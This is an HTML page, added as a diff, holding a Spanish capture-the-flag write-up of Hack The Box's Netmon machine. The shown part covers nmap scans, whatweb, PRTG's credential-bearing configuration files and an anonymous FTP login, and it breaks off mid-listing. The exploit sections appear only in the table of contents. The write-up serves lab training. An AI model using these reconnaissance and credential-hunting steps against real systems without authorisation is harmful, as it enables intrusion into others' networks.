@@ -1,0 +1,1213 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Netmon - Hack The Box · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/htb-writeup-netmon/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Netmon - Hack The Box">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/htb-writeup-netmon/netmon_logo.png">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-bountyhunter/">
+          <span class="side-post-card-title">Bounty Hunter</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-blue/">
+          <span class="side-post-card-title">Blue</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Netmon</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-jerry/">
+          <span class="side-post-card-title">Jerry</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/htb-writeup-lame/">
+          <span class="side-post-card-title">Lame</span>
+          <span class="side-post-card-platform">Hack The Box</span>
+        </a>
+        
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">HackTheBox / Easy Machine</div>
+    
+    <h1>Netmon - Hack The Box</h1>
+    <div class="post-meta">16 January 2023 · 16 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/htb-writeup-netmon/netmon_logo.png" alt="Netmon - Hack The Box">
+  
+
+  
+  <p class="post-lead">Esta es una máquina fácil que usa Windows y en la cual vamos a vulnerar el servicio SMB que está abierto en uno de los puertos a través de la enumeración del servicio FTP y de una vulnerabilidad en el servicio PRTG Network Monitor que nos permite inyectar código en dicho servicio, lo que nos va a permitir crear un usuario con privilegios de administrador siendo de esta forma en la que escalamos privilegios.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>whatweb</code></li><li><code>ftp</code></li><li><code>crackmapexec</code></li><li><code>evil-winrm</code></li><li><code>psexec</code></li><li><code>xfreerdp</code></li><li><code>remmina</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#PRTG">Información Útil del Servicio PRTG Network Monitor</a></li>
+        <li><a href="#FTP">Enumeración Servicio FTP</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Busqueda">Buscando Archivos Críticos de PRTG en Servicio FTP</a></li>
+        <li><a href="#FTP2">Analizando Contenido Descargado del Servicio FTP</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#Exploit">Buscando y Analizando Exploit</a></li>
+        <li><a href="#Exploit2">Probando Exploit: PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution</a></li>
+        <li><a href="#Exploit3">Probando Exploit: PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution - Versión Blog</a></li>
+        <li><a href="#Root">Accediendo a la Máquina como Administrador</a></li>
+        <li><a href="#Extras">Obteniendo Información Extra y Otras Formas de Acceder a la Máquina</a>
+          <ul>
+            <li><a href="#psexec">Accediendo a la Máquina con Psexec</a></li>
+            <li><a href="#rdp">Accediendo a la Máquina con xfreerdp - Remmina</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#PRTG">Información Útil del Servicio PRTG Network Monitor</a></li>
+        <li><a href="#FTP">Enumeración Servicio FTP</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#Busqueda">Buscando Archivos Críticos de PRTG en Servicio FTP</a></li>
+        <li><a href="#FTP2">Analizando Contenido Descargado del Servicio FTP</a></li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#Exploit">Buscando y Analizando Exploit</a></li>
+        <li><a href="#Exploit2">Probando Exploit: PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution</a></li>
+        <li><a href="#Exploit3">Probando Exploit: PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution - Versión Blog</a></li>
+        <li><a href="#Root">Accediendo a la Máquina como Administrador</a></li>
+        <li><a href="#Extras">Obteniendo Información Extra y Otras Formas de Acceder a la Máquina</a>
+          <ul>
+            <li><a href="#psexec">Accediendo a la Máquina con Psexec</a></li>
+            <li><a href="#rdp">Accediendo a la Máquina con xfreerdp - Remmina</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Realizamos un ping para saber si la máquina está conectada y para saber qué sistema operativo tiene, analizando el TTL.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 10.10.10.152
+</span></span><span style="display:flex;"><span>PING 10.10.10.152 <span style="color:#f92672">(</span>10.10.10.152<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.152: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">127</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">129</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.152: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">127</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.152: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">127</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">129</span> ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 10.10.10.152: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">127</span> time<span style="color:#f92672">=</span><span style="color:#ae81ff">132</span> ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 10.10.10.152 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3012ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 128.379/129.681/131.953/1.365 ms
+</span></span></code></pre></div><p>Observamos que es una máquina Windows gracias al TLL. Ahora analicemos los puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<p>Hacemos un escaneo de puertos para saber cuáles están abiertos y asi poder analizar los servicios que operan en estos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 10.10.10.152 -oG allPorts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-01-16 13:32 CST
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 13:32
+</span></span><span style="display:flex;"><span>Scanning 10.10.10.152 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 139/tcp on 10.10.10.152
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 10.10.10.152
+</span></span><span style="display:flex;"><span>Discovered open port 21/tcp on 10.10.10.152
+</span></span><span style="display:flex;"><span>Discovered open port 445/tcp on 10.10.10.152
+</span></span><span style="display:flex;"><span>Discovered open port 135/tcp on 10.10.10.152
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 13:33, 27.19s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.152
+</span></span><span style="display:flex;"><span>Host is up, received user-set <span style="color:#f92672">(</span>1.3s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2023-01-16 13:32:46 CST <span style="color:#66d9ef">for</span> 27s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">55540</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>, <span style="color:#ae81ff">9990</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE      REASON
+</span></span><span style="display:flex;"><span>21/tcp  open  ftp          syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>80/tcp  open  http         syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>135/tcp open  msrpc        syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn  syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds syn-ack ttl <span style="color:#ae81ff">127</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/bin/../share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 27.44 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">126822</span> <span style="color:#f92672">(</span>5.580MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">10051</span> <span style="color:#f92672">(</span>402.100KB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Vemos varios puertos abiertos siendo el FTP, Web y SMB. Ahora vamos a analizar los servicios que hay en estos puertos.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<p>Una vez realizado el escaneo de puertos, hacemos un escaneo de servicios. Veamos con que nos encontramos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sC -sV -p21,80,135,139,445 10.10.10.152 -oN targeted     
+</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-01-16 13:34 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.152
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.13s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE      VERSION
+</span></span><span style="display:flex;"><span>21/tcp  open  ftp          Microsoft ftpd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| 02-03-19  12:18AM                 <span style="color:#ae81ff">1024</span> .rnd
+</span></span><span style="display:flex;"><span>| 02-25-19  10:15PM       &lt;DIR&gt;          inetpub
+</span></span><span style="display:flex;"><span>| 07-16-16  09:18AM       &lt;DIR&gt;          PerfLogs
+</span></span><span style="display:flex;"><span>| 02-25-19  10:56PM       &lt;DIR&gt;          Program Files
+</span></span><span style="display:flex;"><span>| 02-03-19  12:28AM       &lt;DIR&gt;          Program Files <span style="color:#f92672">(</span>x86<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| 02-03-19  08:08AM       &lt;DIR&gt;          Users
+</span></span><span style="display:flex;"><span>|_02-25-19  11:49PM       &lt;DIR&gt;          Windows
+</span></span><span style="display:flex;"><span>| ftp-syst: 
+</span></span><span style="display:flex;"><span>|_  SYST: Windows_NT
+</span></span><span style="display:flex;"><span>80/tcp  open  http         Indy httpd 18.1.37.13946 <span style="color:#f92672">(</span>Paessler PRTG bandwidth monitor<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-trane-info: Problem with XML parsing of /evox/about
+</span></span><span style="display:flex;"><span>| http-title: Welcome | PRTG Network Monitor <span style="color:#f92672">(</span>NETMON<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_Requested resource was /index.htm
+</span></span><span style="display:flex;"><span>|_http-server-header: PRTG/18.1.37.13946
+</span></span><span style="display:flex;"><span>135/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds Microsoft Windows Server <span style="color:#ae81ff">2008</span> R2 - <span style="color:#ae81ff">2012</span> microsoft-ds
+</span></span><span style="display:flex;"><span>Service Info: OSs: Windows, Windows Server <span style="color:#ae81ff">2008</span> R2 - 2012; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   311: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2023-01-16T19:34:28
+</span></span><span style="display:flex;"><span>|_  start_date: 2023-01-16T19:30:07
+</span></span><span style="display:flex;"><span>| smb-security-mode: 
+</span></span><span style="display:flex;"><span>|   account_used: guest
+</span></span><span style="display:flex;"><span>|   authentication_level: user
+</span></span><span style="display:flex;"><span>|   challenge_response: supported
+</span></span><span style="display:flex;"><span>|_  message_signing: disabled <span style="color:#f92672">(</span>dangerous, but default<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: 2s, deviation: 0s, median: 2s
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 18.51 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Observamos que el <strong>servicio FTP</strong> tiene activo el login como <strong>Anonymous</strong> por lo que podemos empezar por ahí nuestra búsqueda de acceso a la máquina, también vemos el <strong>servicio SMB</strong> activo que podemos analizar después y por último vemos un <strong>servicio web</strong> abierto que podemos analizar a continuación.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="HTTP">Analizando Servicio HTTP</h3>
+<p>Vamos a analizar la página web abierta antes de ir al <strong>serivico FTP</strong>, usaremos la herramienta <strong>whatweb</strong> para esto:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://10.10.10.152/ <span style="color:#f92672">[</span><span style="color:#ae81ff">302</span> Found<span style="color:#f92672">]</span> Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, HTTPServer<span style="color:#f92672">[</span>PRTG/18.1.37.13946<span style="color:#f92672">]</span>, IP<span style="color:#f92672">[</span>10.10.10.152<span style="color:#f92672">]</span>, PRTG-Network-Monitor<span style="color:#f92672">[</span>18.1.37.13946,PRTG<span style="color:#f92672">]</span>, RedirectLocation<span style="color:#f92672">[</span>/index.htm<span style="color:#f92672">]</span>, UncommonHeaders<span style="color:#f92672">[</span>x-content-type-options<span style="color:#f92672">]</span>, X-XSS-Protection<span style="color:#f92672">[</span>1; mode<span style="color:#f92672">=</span>block<span style="color:#f92672">]</span>                                
+</span></span><span style="display:flex;"><span>ERROR Opening: http://10.10.10.152/index.htm - incorrect header check
+</span></span></code></pre></div><p>Nos da un curioso error, una vez que entramos a la página web vemos el servicio que está usando, <strong>PRTG Network Monitor (Netmon)</strong></p>
+<p>¿Pero que chuchas es este servicio?</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>PRTG Network Monitor</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>PRTG es un software de monitoreo de red sin agentes de Paessler AG. El término general Paessler PRTG aúna varias versiones de software capaces de monitorizar y clasificar diferentes condiciones del sistema, como el uso del ancho de banda o el tiempo de actividad, y recopilar estadísticas de diversos anfitriones como switches, routers, servidores y otros dispositivos y aplicaciones.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p><img src="/assets/images/htb-writeup-netmon/Captura1.png" alt=""></p>
+<p>Osease que monitorea redes, esto es bastante útil así que investiguemos un poco más.</p>
+<p>Algo que podemos investigar, es donde se guarda las carpetas de instalación de este programa, puede que ahí se almacenen contraseñas o información critica que podamos usar.</p>
+<h3 id="PRTG">Información Útil del Servicio PRTG Network Monitor</h3>
+<table>
+	<thead>
+			<tr>
+					<th>Directorio de Programas</th>
+					<th>Directorio de Datos</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>Sistemas de 32 bits: % archivos de programa% \ PRTG Network Monitor</em></td>
+					<td><em>% programdata% \ Paessler \ PRTG Network Monitor -&gt; Almacenamiento de datos</em></td>
+			</tr>
+			<tr>
+					<td><em>Sistemas de 64 bits: % archivos de programa (x86)% \ PRTG Network Monitor</em></td>
+					<td></td>
+			</tr>
+	</tbody>
+</table>
+<p><strong>Para encontrar el camino correcto para la instalación de PRTG, por favor búsquelo en las propiedades de los iconos de PRTG el menú de inicio. Nota: Windows ProgramData está oculta por defecto.</strong></p>
+<p><strong>Ojito con lo siguiente</strong>, los siguientes archivos se almacenan en el <strong>directorio de datos de PRTG</strong>:</p>
+<table>
+	<thead>
+			<tr>
+					<th>Archivos Críticos en Directorio de Datos</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>PRTG Configuration.dat</em></td>
+					<td>Configuración de monitoreo (por ejemplo, sondas, grupos, dispositivos, sensores, usuarios, mapas, informes y más)</td>
+			</tr>
+			<tr>
+					<td><em>Configuración de PRTG.old</em></td>
+					<td>Copia de seguridad de la versión anterior de la configuración de monitoreo</td>
+			</tr>
+	</tbody>
+</table>
+<p>Aquí podemos ver más información:</p>
+<ul>
+<li><a href="https://kb.rolosa.com/np-donde-almacena-la-informacion-prtg/" target="_blank">¿Dónde almacena la información PRTG?</a></li>
+</ul>
+<p>Tenemos mucha información crítica, el problema es ver si podemos revisar los archivos de la máquina, probemos primero con el <strong>servicio FTP</strong> y si no encontramos nada, investigaremos el <strong>servicio SMB</strong>.</p>
+<h3 id="FTP">Enumeración Servicio FTP</h3>
+<p>De acuerdo al escaneo de servicios, el <strong>servicio FTP</strong> tiene activo el usuario <strong>anonymous</strong>, para entrar es tan simple como usar el usuario <strong>anonymous</strong> y poner una contraseña cualquiera:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>ftp 10.10.10.152 
+</span></span><span style="display:flex;"><span>Connected to 10.10.10.152.
+</span></span><span style="display:flex;"><span>220 Microsoft FTP Service
+</span></span><span style="display:flex;"><span>Name (10.10.10.152:berserkwings): anonymous
+</span></span><span style="display:flex;"><span>331 Anonymous access allowed, send identity (e-mail name) as password.
+</span></span><span style="display:flex;"><span>Password: 
+</span></span><span style="display:flex;"><span>230 User logged in.
+</span></span><span style="display:flex;"><span>Remote system type is Windows_NT.
+</span></span></code></pre></div><p>Bien, una vez dentro, vamos a investigar que hay:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>ftp&gt; ls
+</span></span><span style="display:flex;"><span>229 Entering Extended Passive Mode (|||50290|<span style="color:#75715e">)</span>
+</span></span><span style="display:flex;"><span>125 Data connection already open; Transfer starting.
+</span></span><span style="display:flex;"><span>02-03-19  12:18AM                 1024 .rnd
